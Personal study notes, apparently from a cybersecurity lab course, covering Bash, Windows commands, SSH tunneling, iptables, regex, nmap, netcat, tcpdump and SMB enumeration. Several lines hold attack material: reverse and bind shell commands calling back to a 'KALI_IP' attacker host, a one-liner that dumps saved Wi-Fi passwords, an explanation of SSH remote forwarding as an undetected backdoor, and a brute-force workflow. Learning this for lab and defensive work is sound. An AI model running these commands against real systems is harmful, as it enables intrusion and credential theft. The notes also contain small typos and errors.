\- Bash scripting is essentially automating processes in Linux using a file containing commands that can be executed together. 



Projects:

1\) Create a script that prints out the most commonly needed nmap commands based off of user input for IPs and Ports

2\) Create a script that checks if a directory exists, if it does exist, see if a specific file exists within that directory. If it does not, create the file. Print whether or not the directories or file exists, if it doesn't exist, print that it is now created. 



NMAP Commands:



<target> = IP/hostname/range <port> = port or range



1\) Basic host discovery (Is it up, no port scan)

* nmap -sn <target>

2\) Quick scan of the most common 1000 ports

* nnmap <target>

3\) Scan specific ports

* nmap -p 80,443 <target>
* nmap -p 1-1000 <target>

> nmap -p- <target> # all 65535 ports - slow but through

4\) Service/version detection (What's actually running on open ports)

* nmap -sV <target>

5\) OS detection

* nmap -O <target>

6\) Aggressive scan - combines OS detect, version detect, script scanning, traceroute

* nmap -A <target>

7\) Stealthier Scan

* nmap -sS <target>

8\) Scan a whole subnet

* nmap 192.168.0.0/24

9\) Use NSE (Nmap Scripting Engine) for vulnerability checks

* nmap --script vuln <target>

10\) Save output to a file

* nmap -oN results.txt <target>
* nmap -oX results.xml <target> # useful to feed other tools



Shell

\- The term refers to a program that provides a command-line interface for interacting with an operating system. Bash is one of the most common shells. 

\- PS command can be used to determine the shell type in use

\- date: displays the current date

\- pwd: displays the present working directory

\- ls: lists the contents of the current directory

\- echo: prints a string of text, or value of a variable to the terminal

\- man: refers you to the commands manual



\- bash scripts end with .sh 

\- bash scripts start with a shebang. Shebang is a combination of bash # and bang ! followed by the bash shell path. This is the first linie of the script. Shebang tells the shell to execute it via bash shell. Shebang is simply an absolute path to the bash interpreter. I.e. /bin/bash is where the bash interpreter lives in the file system.



if you can't find it: which bash



ex. #!/bin/bash 



\*\*Note\*\* you can use su - <username> to switch users in Linux



\- To make a file executable:

> chmod u+x <file\_name.sh>



Variables in Bash example:

zaira@Zaira:\~$ country=Pakistan

zaira@Zaira:\~$ echo $country

Pakistan

zaira@Zaira:\~$ new\_country=$country

zaira@Zaira:\~$ echo $new\_country

Pakistan



read -p can be used to pause the script to wait for the user's input. Whatever you type gets stored as a defined variable in the script. 



case $variable\_name in is a decision gate. It looks at what's stored in variable\_name and executes whatever matches in the script. 



Appending to a file:

echo "More text." >> output.txt

this appends the text "More text.: to the end of the file output.txt



Redirecting output:

ls > files.txt

This lists the files in the current directory and write the output to a file named files.txt. 



Basic Bash Commands:



cd: Change the directory to a different location.

ls: List the contents of the current directory.

mkdir: Create a new directory.

touch: Create a new file.

rm: Remove a file or directory.

cp: Copy a file or directory.

mv: Move or rename a file or directory.

echo: Print text to the terminal.

cat: Concatenate and print the contents of a file.

grep: Search for a pattern in a file.

chmod: Change the permissions of a file or directory.

sudo: Run a command with administrative privileges.

df: Display the amount of disk space available.

history: Show a list of previously executed commands.

ps: Display information about running processes.



\-gt checks if a number is greater than another

ex. $num -gt 0

\-lt checks if a number is less than another

ex. $num -lt 0



In bash, case statements are used to compare a given value against a list of patterns and execute a block of code based on the first pattern that matches. 



Cron is a powerful utility for job scheduling that is available in Unix-like operating systems. By configuring cron, you can set up automated jobs to run on a daily, weekly, monthly, or specific time basis. 



0 0	Run a script at midnight every day	0 0 /path/to/script.sh

/5	Run a script every 5 minutes	/5 /path/to/script.sh

0 6 1-5	Run a script at 6 am from Monday to Friday	0 6 1-5 /path/to/script.sh

0 0 1-7	Run a script on the first 7 days of every month	0 0 1-7 /path/to/script.sh

0 12 1	Run a script on the first day of every month at noon	0 12 1 /path/to/script.sh



set -x command at the beginning of your bash script enables debugging mode which causes Bash to print each command that it executes to terminal. 



set -e will cause your script to exit immediately when any command in the script fails. 







Windows Administration



The net accounts command is used to set the policy settings on local computer. such as account policies and password policies. Must be used on the local computer.





/FORCELOGOFF:{minutes | NO} Sets the number of minutes a user has before being forced to log off when the account expires or valid logon hours expire. NO, the default, prevents forced logoff.



/MINPWLEN:length Sets the minimum number of characters for a password. The range is 0-14 characters; the default is six characters.



/MAXPWAGE:{days | UNLIMITED} Sets the maximum number of days that a password is valid. No limit is specified by using UNLIMITED. /MAXPWAGE can't be less than /MINPWAGE. The range is 1-999; the default is 90 days.



/MINPWAGE:days Sets the minimum number of days that must pass before a user can change a password. A value of zero sets no minimum time. The range is 0-999; the default is zero days. /MINPWAGE can't be more than /MAXPWAGE.\\



/UNIQUEPW:number Requires that a user's passwords be unique through the specified number of password changes. The maximum value is 24.



/DOMAIN Performs the operation on a domain controller of the current domain. Otherwise, the operation is performed on the local computer.



Icacls



A windows command-line tool that lets you view and change who has permission to access files and folders. Stands for Integrity Control Access Control List. DACLs are just lists attached to every file/folder that says who can access them. Icacls let you read and edit that dacl list. 



\*\*\*Note: windows version of ls is dir\*\*



See who access to a file:

> icacls myfile.txt



Give someone full control:

> icacls myfile.txt /grant John:(F)



Block someone:

> icacls myfile.txt /deny John:(W)



Remove someone's permissions entirely:

> icacls myfile.txt /remove John



Reset permissions back to defaults:

> icacls myfile.txt /reset



|Letter |Meaning|Plain English|
|-|-|-|
|F|Full control|Can do anything|
|M|Modify|Can read write delete|
|RX|Read \& Execute|Can read and run|
|R|Read only|Read only|
|W|Write only|Can edit but not read|
|D|Delete|Can delete|
|M|No access|Blocked|



When you see things like (OI) and (CI), that's about whether permissions trickle down from a folder to stuff inside it:



(I) — "I inherited this permission from my parent folder"

(OI) — Object Inherit — "Files inside this folder get this permission too"

(CI) — Container Inherit — "Subfolders inside this folder get this permission too"

(IO) — Inherit Only — "This rule only applies to children, not the folder itself"

(NP) — No Propagate — "Pass it down one level but stop there"



There are also advanced/granular permissions (like DE for delete, WO for take ownership, WDAC for change permissions) but those are for fine-tuned control. The basic letters above cover most real-world scenarios.





Windows Command line Commands



powershell start cmd -v runAs Runs the command prompt as an administrator



driverquery lists all installed drivers



systeminfo shows your pc's details



clip copies an item to the clipboard

> for example dir | clip copieis all the contents of the present working directory to the clipboard. 



Assoc lists programs and the extensions they are associated with



If you want to quickly see the difference between two files you can enter the following command:

> fc "file-1-path" "file-2-path"



netstat -an shows open ports, their ip addresses and states



for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear shows all wifi passwords



sfc system file checker this command scans your computer for corrupt files and repairs them. The extension of the command you can use to run a scan is /scannow



You can hide a folder right from the command line by typing in attrib +h +s +r folder\_name

To show the folder again, execute the command - attrib -h -s -r folder\_name



tasklist shows open programs



taskkill terminates a running task

To kill a task, run taskkill /IM "task.exe" /F



time shows and changes the current time



more shows more information or the contents of a file



cls clears the command line



PsExec



A free Microsoft toll that lets you run commands and programs on another windows computer remotely, without needing to install anything on that remote machine first. You just need admin credentials on the target machine and network access to it. 



The general format is:

psexec \\\\remote\_computer command

That's it at its simplest. You're saying "on this remote computer, run this command."



Copy a program to a remote machine and run it:

psexec \\\\remote\_computer -c myprogram.exe

The -c flag copies the file over first, then executes it. Without -c, the program has to already exist on the remote machine.



Run something as the SYSTEM account (highest privilege on Windows):

psexec -i -d -s c:\\windows\\regedit.exe



Or put a list of computer names in a text file:

psexec @computers.txt ipconfig /all

Run on every computer in the domain:

psexec \\\\\* hostname



Using powershell or netsh to manage windows firewalls



On

\# PowerShell

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True



\# netsh

netsh advfirewall set allprofiles state on



Off

\# PowerShell

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False



\# netsh

netsh advfirewall set allprofiles state off



Create a firewall rule

Allow inbound traffic for a program:

\# PowerShell

New-NetFirewallRule -DisplayName "Allow Inbound Telnet" -Direction Inbound -Program %SystemRoot%\\System32\\tlntsvr.exe -RemoteAddress LocalSubnet -Action Allow



\# netsh

netsh advfirewall firewall add rule name="Allow Inbound Telnet" dir=in program=%SystemRoot%\\System32\\tlntsvr.exe remoteip=localsubnet action=allow



Block outbound traffic on a specific port:

New-NetFirewallRule -DisplayName "Block Outbound Telnet" -Direction Outbound -Program %SystemRoot%\\System32\\tlntsvr.exe -Protocol TCP -LocalPort 23 -Action Block



The key parameters when creating a rule:

ParameterWhat it sets-DisplayNameThe human-readable name for your rule-DirectionInbound or Outbound-ActionAllow or Block-ProtocolTCP, UDP, etc.-LocalPortWhich port on this machine-RemoteAddressWhich IPs this applies to-ProgramWhich executable this applies to



Change which remote IP a rule applies to:

\# PowerShell

Set-NetFirewallRule -DisplayName "Allow Web 80" -RemoteAddress 192.168.0.2



\# netsh

netsh advfirewall firewall set rule name="Allow Web 80" new remoteip=192.168.0.2



Manage firewall on a remote machine

\# View all rules on a remote computer

Get-NetFirewallRule -CimSession RemoteDevice



\# Delete a rule on a remote computer

$RemoteSession = New-CimSession -ComputerName RemoteDevice

Remove-NetFirewallRule -DisplayName "AllowWeb80" -CimSession $RemoteSession



IPsec transport mode — encrypts traffic between two specific machines

IPsec tunnel mode — creates an encrypted tunnel between two networks (like a VPN)

Domain isolation — uses IPsec to require that only domain-joined machines can talk to each other, blocking non-domain devices

Server isolation — goes further by restricting access to specific servers to only certain user groups, with mandatory encryption

Authenticated bypass — lets trusted devices (like security scanners) bypass firewall block rules if they can prove their identity







Kali Linux VM SSH Concepts



SSH \& WINSCP



SSH (Secure Shell) is a protocol that lets you log into and control another computer remotely over an encrypted connection. Everything sent is encrypted. 

* Remote command-line access to another machine
* Secure file transfers (SCP and SFTP)
* Port Forwarding / tunneling
* End-to-end encryption



How it works:

* Client (Kali VM) connects to port 22 on the server (Ubuntu/Debian/Other)
* They negotiate encryption - agree on ciphers then exchange keys
* Client authenticates
* Granted access to the shell on remote machines



This creates two files: a private key (stays on your machine, never share it) and a public key (goes on the server you want to access). When you connect, SSH uses math to prove you have the private key without ever sending it over the network. No password needed, much harder to crack.



To copy your public key to a server:

* ssh-copy-id user@server\_ip



SSH Tunneling



SSH tunneling lets you take any network traffic and route it through an encrypted SSH connection. 



1. Local Port Forwarding ("I want to reach something over there from here")
* You tell SSH "Listen on a port on my machine, and forward anything that hits it through the encrypted tunnel to a specific destination on the other side"
* ssh -L 8080:target\_server:80 user@ssh\_server
* This opens port 8080 on Kali. Any traffic you send to localhost:8080 goes through the encryopoted SSH tunnel to ssh\_server. SSH\_server then forwards it to target\_serrver:80. So you open a browser on Kali, go to http://localhost:8080 and you're actually seeing the webpage from target\_server - all encrypted through the tunnel. 
* Use this to access a web app, database, or service on a remote internal network that you can't reach directly. You ssh into a machine that CAN reach it, and tunnel through. 

2\. Remote Port Forwarding ("Let someone over there reach something here")

* The reverse of above -  you tell the remote SSH server to listen on a port and forward the traffic back through the tunnel to your machine.
* ssh -R 8080:localhost:80 user@ssh\_server
* This makes port 8080 on the remote server forward back to port 80 on your machine. Useful when you want to expose a local service to someone on the other end. 
* This is exactly how you create backdoors. They compromise an internal machine, SSH out to their external server with -R, and now they can access the internal network from the outside through that tunnel. Most firewalls allow OUTBOUND SSH, so this often goes undetected. 

3\. Dynamic Port Forwarding (SOCKS Proxy)

* Turns your SSH connection into a general-purpose proxy. Instead of forwarding one specific port, it creates a SOCKS proxy that any application can route traffic through. 
* ssh -D 9050 user@ssh\_server
* Now configure your browser (or any app) to use localhost:9050 as a SOCKS proxy, and all its traffic goes through the encrypted SSH tunnel and out through the SSH server. Essentially a poor man's VPN.
* So a clean background tunnel looks like: ssh -fN -L 9090:localhost:80 platinum@192.168.170.131



SSH Jump Hosts



* A jump host (also called bastion host) is a machine you hop through to reach another machine that you can't access directly. Instead of SSHing to the jump host, then manually SSHing again from there to the final target, SSH can do this in one command!
* Why this exists: In real networks, sensitive servers aren't exposed to the internet. They sit behind firewalls. You can only reach them by first connecting to a gateway/bastion machine that has access to both the external and internal networks. Jump hosts automate that in two steps.
* \-J flag command. SSH connects to jumphost first, then automatically bounces through it to targethost. You authenticate to both, but it's seamless. 
* ssh -J user1@host1:port1 user2@host2 -p port2 #with different ports or users
* ssh -J user1@host1,user2@host2 user3@host3 #multiple jumps



To make it permanent in your SSH config put it in \~/.ssh/config:



Host jumpbox

&#x20;   HostName 192.168.170.131

&#x20;   User platinum



Host internal-server

&#x20;   HostName 10.0.0.5

&#x20;   User admin

&#x20;   ProxyJump jumpbox





Iptables





Iptables is a command-line tool that lets you set rules for how your Linux system handles network traffic - what gets allowed in, what gets blocked, what gets forwarded. It's built on top of a kernel framework called netfilter that does the actual packet filtering, iptables is just the interface you use to tell netfilter what to do. 



Tables

* Tables define the type of operation you're doing on packets. There are four:

&#x09;1. Filter: allow or block traffic. 

&#x09;2. Nat: Changes source/destination addresses. Port forwarding, masquerading, 	routing traffic to other hosts. 

&#x09;3. Mangle: Alter packet headers. Changing TTL values, marking packets for 	routing.

&#x09;4. Raw: Bypass connection tracking. Exempting certain traffic from stateful 	inspection. 

Chains

* Chains are checkpoints where packets get inspected. Each table has specific chains:

&#x09;1. Input: packet is arriving and is destined for this machine.

&#x09;2. Output: packet was created by this machine and is leaving. 

&#x09;3. Forward: packet is passing through this machine to somewhere else.

&#x09;4. Prerouting: packet just arrived, before any routing decision.

&#x09;5. Postrouting: packet is about to leave, after routing decision. 



How packets flow through rules:

* When a packet hits a chain, iptables check it against every rule in order, top to bottom. The moment it matches a rule with a terminating target (Accept, drop, reject), it stops - no further rules are checked. If it gets to the end without matching anything, the default policy of the chain decides(default is accept). Therefore rule order matters. 



Essential Iptables Commands



Block an IP

* iptables -A INPUT -s 59.45.175.62 -j DROP
* \-A = append chain, -s = source IP, -j = jump to target

Block an IP range 

* iptables -A INPUT -s 59.45.175.0/24 -j DROP

Block outgoing traffic to an IP

* iptables -A OUPUT -d 31.13.78.35 -j DROP
* \-d = destination IP

Block a specific port

* iptables -A INPUT -p tcp -m tcp --dport 22 -s 59.45.175.0/24 -j DROP
* \-p tcp = protocol  is tcp, -m tcp = load the TCP module, --dport 22 = destination port 22(ssh). 

Block multiple ports at once

* iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j DROP

List all rules

* iptables -L -n --line-numbers
* \-L = list, -n = don't do DNS lookup, --line-numbers = show position numbers in list

Delete a rule

* iptables -D INPUT -s 59.45.175.62 -j DROP
* iptables -D INPUT 2
* When deleting multiple rules by line number, delete highest numbers first otherwise the numbers shift and you delete the wrong rules. 

Insert a rule at a specific position

* iptables -I INPUT 1 -s 59.45.175.10 -j ACCEPT
* This inserts at line 1 (the top), pushing everything else down. Critical for whitelisting an IP that's inside a blocked range. 



Connection tracking (conntrack)

* This is the thing that trips up everyone. If you block incoming traffic from an IP. you also can't connect to that IP anymore. Why? Because your outgoing request reaches them but their response comes in through the INPUT chain and gets dropped. 
* The fix: tell iptables to always allow packets that belong to connections you already started!
* iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
* This should be the first rule in you INPUT chain. 
* iptables -P INPUT DROP now everything incoming is dropped unless a rule explicitly allows it. This is a whitelist approach. Do this only AFTER adding the conntrack ESTABLISHED,RELATED rule above or your connections will break. 



Negating conditions

* The ! operator flips a condition. Accept everything EXCEPT certain ports:
* iptables -A INPUT -p tcp -m multiport ! --dports 22,80,443 -j DROP
* This drops TCP traffic to any port that is NOT 22, 80, or 443. 



Custom Chains

* Instead of cramming everything into INPUT, you can create your own chains for organization:

\# Create the chain

iptables -N ssh-rules



\# Add rules to it

iptables -A ssh-rules -s 192.168.170.0/24 -j ACCEPT

iptables -A ssh-rules -j DROP



\# Reference it from INPUT

iptables -A INPUT -p tcp --dport 22 -j ssh-rules

* Any SSH traffic that hits the INPUT rule, jumps to ssh-rules, gets processed there. 



Saving and restoring rules

* iptables rules disappear on reboot unless you save them.
* iptables-save > /tmp/iptables.rules
* iptables-restore < /tmp/iptables.rules



To make them persist across reboots:

CentOS (what you'll use):

bashsudo dnf install iptables-services -y

sudo systemctl enable iptables

sudo service iptables save

Ubuntu/Debian:

bashsudo apt install iptables-persistent -y

It saves automatically during install and you can re-save with sudo netfilter-persistent save.





RegEX





RegEx is a way to search for patterns in text using special symbols instead of searching for exact words. RegEx is a pattern language. 

* Useful for grep/log analysis - searching through massive log files for patterns (i.e. specific IPs, login attempts, suspicious users)
* nmap NSE scripts - pattern matching in service responses
* iptables - some advanced matching uses regex-like patterns
* python scripting - extracting IPs, emails, hashes, URLs from text
* SIEM tools - writing detection rules that match patterns of malicious activity
* sed/awk - text processing in bash scripts



* In RegEx . means any character and \* means repeat the last thing any number of times including 0. so .\* basically means anything. 



Characters

Symbol   Meaning                                          Example      Matches

.        Any single character                             c.t          cat, cot, cut, c9t

\\d       Any digit (0-9)                                   \\d\\d\\d       123, 456, 789

\\w       Any word character (letters, digits, underscore)  \\w\\w         ab, a1, \_x

\\s       Any whitespace (space, tab, newline)               hello\\sworld "hello world"

\\D       Anything that's NOT a digit                        \\D\\D         ab, !@, zz

\\W       Anything that's NOT a word character               \\W           !, @, (space)

\\S       Anything that's NOT whitespace                     \\S+          any unbroken word



Qualifiers

Symbol    Meaning              Example     Matches

\------    -------              -------     -------

\*         Zero or more         ab\*c        ac, abc, abbc, abbbc

\+         One or more          ab+c        abc, abbc, abbbc (NOT ac)

?         Zero or one (opt.)   colou?r     color, colour

{3}       Exactly 3            \\d{3}       123, 456 (exactly 3 digits)

{2,4}     Between 2 and 4      \\d{2,4}     12, 123, 1234

{2,}      2 or more            \\d{2,}      12, 123, 12345678



ANCHORS (where in the text)

\----------------------------

Symbol    Meaning              Example     Matches

\------    -------              -------     -------

^         Start of line        ^Error      Lines starting with "Error"

$         End of line          \\.exe$      Lines ending with ".exe"

\\b        Word boundary        \\bcat\\b     "cat" but NOT "category"





CHARACTER CLASSES (pick from a set)

\------------------------------------

Syntax          Meaning                    Example           Matches

\------          -------                    -------           -------

\[abc]           Any one of a, b, or c      \[cb]at            cat, bat

\[a-z]           Any lowercase letter       \[a-z]+            hello, world

\[0-9]           Any digit (same as \\d)     \[0-9]{3}          123, 999

\[^abc]          Any character EXCEPT a,b,c \[^0-9]            anything not a digit

\[a-zA-Z0-9]     Any letter or digit        \[a-zA-Z0-9]+      Hello123



Note: ^ inside \[] means "NOT." Outside \[] it means "start of line." Context matters.





GROUPS AND ALTERNATION

\------------------------

Syntax          Meaning                    Example           Matches

\------          -------                    -------           -------

(abc)           Group - treat as one unit  (ab)+             ab, abab, ababab

|               OR                         cat|dog           cat or dog

(cat|dog)       Group with OR              I have a (cat|dog)   "I have a cat" or "I have a dog"





Match an IPv4 address:

* \\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b

Match an email address:

* \[\\w.-]+@\[\\w.-]+\\.\\w+

Match a MAC address:

* (\[0-9a-fA-F]{2}:){5}\[0-9a-fA-F]{2}

Match a URL:

* https?://\[\\w./-]+

Find failed SSH login attempts in logs:

* grep -E "Failed password.\*from \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" /var/log/auth.log

Extract all IPs from a file:

* grep -oE "\\b\[0-9]{1,3}\\.\[0-9]{1,3}\\.\[0-9]{1,3}\\.\[0-9]{1,3}\\b" logfile.txt
* \-o = only print the match, not the whole line. -E = use extended regex.





Nmap (Network Mapper)



Nmap is a network reconnaissance tool. It discovers hosts on a network, finds open ports, identifies what services are running on those ports, detects operating systems, and can run scripts to check for vulnerabilities. It's the first tool most pentesters and CTF players reach for. 



When nmap scans a port, it reports one of these:

&#x09;1. open: something is actively listening - a service is running. 

&#x09;2. closed: port is accessible but nothing is listening.

&#x09;3. filtered: a firewall is blocking nmap's probes - can't tell if open or 	closed.

&#x09;4. unfiltered: port is accessible but nmap can't determine open or closed. 

&#x09;5. open|filtered: Can't tell if it's open or filtered. 





Scan types



Host discovery:



\# Ping scan — just check if hosts are up, don't scan ports

nmap -sn 192.168.170.0/24



\# Skip discovery, assume host is up (useful when ICMP is blocked)

nmap -Pn 192.168.170.131



Port Scanning:



\# Default scan — top 1000 most common ports

nmap 192.168.170.131



\# Scan specific ports

nmap -p 22,80,443 192.168.170.131



\# Scan a range

nmap -p 1-1000 192.168.170.131



\# Scan ALL 65535 ports — slow but thorough

nmap -p- 192.168.170.131



\# Fast scan — top 100 ports only

nmap -F 192.168.170.131



Scan Techniques:



\# SYN scan (default when run as root) — fast, stealthy

\# Sends SYN, waits for SYN-ACK (open) or RST (closed), never completes handshake

sudo nmap -sS 192.168.170.131



\# TCP connect scan — full handshake, less stealthy, doesn't need root

nmap -sT 192.168.170.131



\# UDP scan — checks UDP ports (DNS, SNMP, DHCP live here)

\# Much slower than TCP scans

sudo nmap -sU 192.168.170.131



\# Combined TCP and UDP

sudo nmap -sS -sU 192.168.170.131



Service and OS detection:



\# Version detection — what software and version is running on each port

nmap -sV 192.168.170.131



\# OS detection

sudo nmap -O 192.168.170.131



\# Aggressive scan — OS detect + version detect + scripts + traceroute

nmap -A 192.168.170.131



Banner grabbing with nmap:



\# Grab banners from services

nmap -sV --script=banner 192.168.170.131



\# Target a specific port

nmap -sV --script=banner -p 22 192.168.170.131



* The banner is the text a service sends when you first connect - often reveals software name and version. 



NSE (Nmap Scripting Engine):



\# Run default scripts (safe, useful info gathering)

nmap -sC 192.168.170.131



\# Version detect + default scripts (most common combo)

nmap -sV -sC 192.168.170.131



\# Vulnerability scanning

nmap --script vuln 192.168.170.131



\# Run a specific script

nmap --script http-title -p 80 192.168.170.131



\# See what scripts are available

ls /usr/share/nmap/scripts/



\# Search for scripts by name

ls /usr/share/nmap/scripts/ | grep ssh



Output formats:



\# Normal text output to file

nmap -oN scan.txt 192.168.170.131



\# XML (useful for importing into other tools)

nmap -oX scan.xml 192.168.170.131



\# Greppable output (easy to parse with grep/regex)

nmap -oG scan.gnmap 192.168.170.131



\# All formats at once

nmap -oA scan\_results 192.168.170.131



Timing and Stealth:



\# -T0 through -T5 (paranoid to insane)

nmap -T4 192.168.170.131    # aggressive timing, good for local VMs

nmap -T1 192.168.170.131    # slow and quiet, avoids IDS detection



Example CTF workflow:



\# Step 1: Quick scan to see what's obviously open

nmap -F TARGET\_IP



\# Step 2: Full port scan in background

nmap -p- -T4 TARGET\_IP -oN full\_scan.txt



\# Step 3: Deep scan on discovered ports

nmap -sV -sC -p <discovered\_ports> TARGET\_IP -oN detailed\_scan.txt



\# Step 4: Vuln scan if needed

nmap --script vuln -p <discovered\_ports> TARGET\_IP





Netcat(nc)



Netcat is a tool that reads and writes data across network connections. 



Basic Syntax:



\# Connect to a remote host on a port (client mode)

nc HOST PORT



\# Listen on a port (server mode)

nc -lvnp PORT





Flag    Meaning

\----    -------

\-l      Listen mode (be a server)

\-v      Verbose (show connection info)

\-n      No DNS lookup (use IPs directly, faster)

\-p      Specify port number

\-u      Use UDP instead of TCP

\-w      Timeout in seconds

\-z      Zero I/O mode (just check if port is open, don't send data)

\-e      Execute a program on connection (not in all versions - security risk by design)



Banner grabbing:



\# Grab SSH banner

nc -v 192.168.170.131 22

\# Output: SSH-2.0-OpenSSH\_9.2p1 Debian-2



\# Grab HTTP banner

nc -v 192.168.170.131 80

\# Then type:

GET / HTTP/1.0

\# Press Enter twice — you'll get the HTTP headers back



\# Grab SMTP banner

nc -v 192.168.170.131 25



\# Grab FTP banner

nc -v 192.168.170.131 21



Port Scanning:



\# Scan a range of ports (quick check)

nc -zvn 192.168.170.131 20-100



\# Scan specific ports

nc -zvn 192.168.170.131 22 80 443



* \-z means don't send any data, just check if the port is open and move on.



File transfer between VMs

On the receiving machine (Debian):

bashnc -lvnp 4444 > received\_file.txt

On the sending machine (Kali):

bashnc 192.168.170.131 4444 < file\_to\_send.txt



Reverse Shell (critical for CTFs)

* This is how you get command-line access to a target machine that connects back to you. The target initiates the connection outward (bypassing firewalls that block inbound). 



On your Kali VM (attacker - set up the listener)

* nc -lvnp 4444



On the target machine (if you can execute a command)

* nc -e /bin/bash KALI\_IP 4444
* if -e not available: bash -i >\& /dev/tcp/KALI\_IP/4444 0>\&1





Bind Shell (opposite direction)

* The target listens and you connect to it
* nc -lvnp 4444 -e /bin/bash
* nc TARGET\_IP 4444
* less useful because firewalls typically block inbound





TCPDUMP (Network Traffic Analysis)



Tcpdump is a command-line packet sniffer. It captures network traffic passing through your machine's network interfaces and lets you read it, filter it, and save it for later analysis. 



Basic usage:



\# Capture everything on the default interface

sudo tcpdump



\# Capture on a specific interface

sudo tcpdump -i eth0

sudo tcpdump -i ens33



\# List available interfaces

sudo tcpdump -D



\# Limit to a certain number of packets

sudo tcpdump -c 50



\# Show packet contents in ASCII (readable text)

sudo tcpdump -A



\# Show packet contents in hex AND ASCII

sudo tcpdump -XX



\# Don't resolve hostnames (faster, cleaner output)

sudo tcpdump -n



\# Don't resolve hostnames OR port names

sudo tcpdump -nn





Filters (BPF - Berkeley Packet Filer)

* tcpdump is powerful because you can filter by anything



Filter by host:



\# All traffic to/from a specific IP

sudo tcpdump -nn host 192.168.170.131



\# Only traffic FROM a specific IP

sudo tcpdump -nn src host 192.168.170.131



\# Only traffic TO a specific IP

sudo tcpdump -nn dst host 192.168.170.131



Filter by port:



\# All traffic on port 22 (SSH)

sudo tcpdump -nn port 22



\# Traffic on port 80 OR 443

sudo tcpdump -nn port 80 or port 443



\# Source port

sudo tcpdump -nn src port 22



\# Destination port

sudo tcpdump -nn dst port 80



Filter by protocol:



\# TCP only

sudo tcpdump -nn tcp



\# UDP only

sudo tcpdump -nn udp



\# ICMP only (ping traffic)

sudo tcpdump -nn icmp



Saving and reading captures:



\# Save capture to a file (pcap format — can open in Wireshark later)

sudo tcpdump -nn -w capture.pcap



\# Save with a packet limit

sudo tcpdump -nn -c 1000 -w capture.pcap



\# Read a saved capture file

sudo tcpdump -nn -r capture.pcap



\# Read and filter a saved capture

sudo tcpdump -nn -r capture.pcap port 80



\# Read and show packet contents

sudo tcpdump -nn -A -r capture.pcap





The Cyber Kill Chain



The Cyber Kill Chain is a 7-step framework created by Lockheed Martin that maps out every stage an attacker must go through to successfully carry out a cyberattack. Understanding the framework helps with defense. 



1. Reconnaissance: Researches and selects their target. Gathers information before ever touching the target's network. 

&#x09;- Passive: Googling the company, reading LinkedIn profiles, checking DNS 		records. No direct contact with the target. 

&#x09;- Active: Port scanning, probing their systems, etc. 

&#x09;- How to defend: Monitor with port scans, limit what's publicly available, 		train employees.

2\. Weaponization: Creates the attack tool. Takes a vulnerability they found and pairs it with a deliverable payload. The attacker combines an exploit (the thing that breaks in) with a payload (the thing that does the damage). 



3\. Delivery: Sends the weapon to the target. Three most common:

&#x09;- Email attachments

&#x09;- Malicious websites

&#x09;- USB drives

&#x09;- How to defend: email filtering, web proxies, endpoint protection, training



4\. Exploitation: The weapon fires. The vulnerability is triggered - the malicious code actually executes. Three categories of what gets exploited:

&#x09;- An application vulnerability (unpatched software)

&#x09;- An operating system vulnerability (unpatched OS)

&#x09;- The user themselves (social engineering)

&#x09;- How to defend: patch management, application whitelisting, endpoint 	detection, least-privilege access. 



5\. Installation: Installs a persistent backdoor on the victim's system. The goal is to maintain access even if the system reboots or the user changes their password. 

&#x09;- How to defend: Endpoint detection and response (EDR), file integrity and 	monitoring, application whitelisting.



6\. Command and Control (C2): The installed malware "calls home" - it opens a communication channel back to the attacker's infrastructure so they can remotely control the compromised system. 

&#x09;- How to defend: Monitor outbound traffic for unusual patterns, DNS 	monitoring for suspicious domains, network segmentation, proxy web traffic.



7\. Actions on Objectives: The actual goal - what they came for. This varies by attacker:

&#x09;- Data exfiltration: stealing files

&#x09;- Data destruction: ransomware, wiping systems

&#x09;- Lateral movement: using compromised machine to attacker other internal 	systems

&#x09;- Privilege escalation: gaining admin/root access

&#x09;- Persistence expansion: compromising more machines to maintain access

&#x09;- How to defend: Data loss prevention, network segmentation, monitor, encrypt 	data, have an incident response plan. 





Describe Enumeration Tools and Techniques



Enumeration is the process of actively extracting detailed information from the target system. 



Enum4linux is a perl script that comes pre-installed on Kali. It's a wrapper around Samba tools (rpcclient, smbclient, nmblookup, net) that automates pulling information from SMB (Server Message Block) services running on Windows or Linux machines. SMB is the protocol Windows uses for file sharing, printer sharing, and network browsing - it runs on ports 139 and 445. SMB is one of the most information-rich protocols you can enumerate. A misconfigured SMD service can hand you usernames, password policies, shared folders, group memberships, and OS details - sometimes without even needing credentials. Can find usernames, groups and memberships, password policies, etc. 



Essential commands:



\# Run ALL basic enumeration checks (the go-to command)

enum4linux -a TARGET\_IP



\# Enumerate users only

enum4linux -U TARGET\_IP



\# Enumerate shares only

enum4linux -S TARGET\_IP



\# Enumerate groups

enum4linux -G TARGET\_IP



\# Get password policy

enum4linux -P TARGET\_IP



\# Enumerate with specific credentials (if you have them)

enum4linux -u username -p password -a TARGET\_IP



\# Get OS information

enum4linux -o TARGET\_IP



\# Verbose output (more detail)

enum4linux -v -a TARGET\_IP



Typical Workflow:

&#x09;1. Nmap finds ports 139/445 open on a target

&#x09;2. Run enum4linux -a TARGET\_IP

&#x09;3. Review the output for usernames, accessible shares, password policies

&#x09;4. Use discovered usernames with a tool like Hydra for brute-forcing

&#x09;5. Use smbclient to connect to any accessible shares 



Connecting to discovered shares:



\# List shares

smbclient -L //TARGET\_IP -N



\# Connect to a specific share (null session / anonymous)

smbclient //TARGET\_IP/share\_name -N



\# Connect with credentials

smbclient //TARGET\_IP/share\_name -U username





NMAP for Enumeration





SMB NSE enumeration scripts



\# Enumerate SMB shares

nmap --script smb-enum-shares -p 445 TARGET\_IP



\# Enumerate SMB users

nmap --script smb-enum-users -p 445 TARGET\_IP



\# Enumerate SMB groups

nmap --script smb-enum-groups -p 445 TARGET\_IP



\# Enumerate SMB sessions (who's logged in)

nmap --script smb-enum-sessions -p 445 TARGET\_IP



\# Get OS info via SMB

nmap --script smb-os-discovery -p 445 TARGET\_IP



\# Check for known SMB vulnerabilities (EternalBlue, etc.)

nmap --script smb-vuln\* -p 445 TARGET\_IP



\# Run ALL SMB scripts at once

nmap --script smb-enum\* -p 445 TARGET\_IP



\# Combine with credentials

